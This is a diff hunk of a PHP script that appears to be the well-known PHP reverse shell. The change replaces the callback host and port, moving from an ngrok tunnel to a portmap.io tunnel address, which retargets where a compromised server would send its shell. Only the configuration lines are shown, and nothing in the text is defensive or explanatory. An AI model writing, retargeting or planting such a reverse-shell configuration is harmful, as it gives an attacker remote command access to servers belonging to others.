@@ -1,8 +1,8 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 16084;       // CHANGE THIS
+$ip = ' jerrygodc-51839.portmap.io';  // CHANGE THIS
+$port = 51839;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
